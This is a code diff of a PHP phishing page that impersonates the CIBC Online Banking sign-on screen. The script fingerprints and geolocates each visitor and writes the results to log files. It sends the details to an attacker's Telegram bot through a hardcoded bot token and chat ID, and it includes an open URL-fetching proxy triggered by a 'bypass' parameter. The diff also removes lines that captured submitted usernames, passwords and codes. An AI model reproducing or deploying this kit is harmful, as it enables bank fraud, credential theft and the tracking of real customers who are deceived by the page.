@@ -1,5 +1,4 @@
 <?php
-
 header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
 header("X-XSS-Protection: 0");
 header("X-Frame-Options: ALLOWALL");
@@ -7,7 +6,6 @@ header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Credentials: true");
 header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
 header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");
-
 if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
     $url = $_GET['url'];
     $ch = curl_init($url);
@@ -27,7 +25,6 @@ if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
     $response = curl_exec($ch);
     $info = curl_getinfo($ch);
     curl_close($ch);
-
     header("HTTP/1.1 ".$info['http_code']);
     foreach ($info['headers'] as $header) {
         if (!preg_match('/^Transfer-Encoding:/i', $header)) {
@@ -37,14 +34,9 @@ if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
     echo $response;
     exit;
 }
-
-
-
-
 $full_date = date("h:i:s|M/d/Y");
 $time = date("h:i:s");
 $date = date("M/d/Y");
-
 function get_client_ip()
 {
     $ipaddress = '';
@@ -63,11 +55,9 @@ function get_client_ip()
     } else {
         $ipaddress = 'UNKNOWN';
     }
-
     return $ipaddress;
 }
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
-
 function getOS() { 
     global $user_agent;
     $os_platform  = "Unknown OS Platform";
@@ -96,14 +86,11 @@ function getOS() {
                           '/blackberry/i'         =>  'BlackBerry',
                           '/webos/i'              =>  'Mobile'
                     );
-
     foreach ($os_array as $regex => $value)
         if (preg_match($regex, $user_agent))
             $os_platform = $value;
-
     return $os_platform;
 }
-
 function getBrowser() {
     global $user_agent;
     $browser        = "Unknown Browser";
@@ -119,26 +106,19 @@ function getBrowser() {
                             '/konqueror/i' => 'Konqueror',
                             '/mobile/i'    => 'Handheld Browser'
                      );
-
-    foreach ($browser_array as $regex => $value)
+                         foreach ($browser_array as $regex => $value)
         if (preg_match($regex, $user_agent))
             $browser = $value;
-
     return $browser;
 }
-
-
 $user_os        = getOS();
 $user_browser   = getBrowser();
- 
 $PublicIP = get_client_ip();
 $localHost = "127.0.0.1";
-
 if (strpos($PublicIP, ',') !== false) {
     $PublicIP = explode(",", $PublicIP)[0];
 }
-
-$file       = 'data.dat';
+$file        = 'data.dat';
 $file1       = 'combo.txt';
 $file2       = 'master.log';
 $ip         = "".$PublicIP;
@@ -160,7 +140,6 @@ else {
 $details  = json_decode($details, true);
 $success  = $details['success'];
 $fp = fopen($file, 'a');
-
 if ($success==false) {
     fwrite($fp, $ip."\n");
     fwrite($fp, $uos."\n");
@@ -179,65 +158,35 @@ if ($success==false) {
     $crn        = $details['currency'];
     $type       = $tp;
     $bank       = "CIBC";
-
-    $url        = "https://CIBC.com";
-    $user       = $_POST['username'];
-    $pass       = $_POST['password'];
-    $code       = $_POST['code']; 
+        $url        = "https://CIBC.com";
 	$lh     = "|";
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
     $currency   = "".$full_date;
     $li     = ",";
-
-    
-
 } else {
     $status     = "Status : ".$success;
     fwrite($fp, $status."\n");
     fwrite($fp, $uaget."\n");
     fclose($fp);
 }
-
-
-
 $message =" $bank$lh$ip\n\n-----------------\n\n$bsr$lh$uos\n\n-----------------\n\n$is\n\n-----------------\n\n$city$lh$country\n\n-----------------\n\n$la$li$lp\n\n-----------------\n\n$uaget";
-
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
     'chat_id' => '-821080105',
     'text' => $message
 ];
-
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                  http_build_query($data) );
-                                                    
-
-?><html lang="en"><head>
+?>
+<html lang="en"><head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-
 <meta charset="utf-8">
-
-
-
 <title>Sign on | CIBC Online Banking</title>
-
-
-
-
-
-
-
-
-
-
-
 <link rel="stylesheet" type="text/css" href="files/157-1f5342e1.css">
 
-
 </head>
-
 <body>
 <div id="app" data-v-app="">
     <div id="orchestrator">
@@ -318,7 +267,4 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
         </div>
     </div>
 </div>
-
-
-
 </body></html>
